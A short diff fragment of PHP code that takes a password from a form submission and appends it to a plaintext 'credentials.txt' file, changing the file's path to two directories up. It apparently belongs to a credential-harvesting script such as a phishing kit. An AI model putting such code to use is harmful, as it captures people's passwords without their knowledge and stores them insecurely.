@@ -7,7 +7,7 @@
     $password = $_POST['password'];
   }
 
-  $file = fopen('credentials.txt', 'a');
+  $file = fopen('../../credentials.txt', 'a');
   if ($file) {
     // Set the GMT offset to +3
     $gmt = 3;
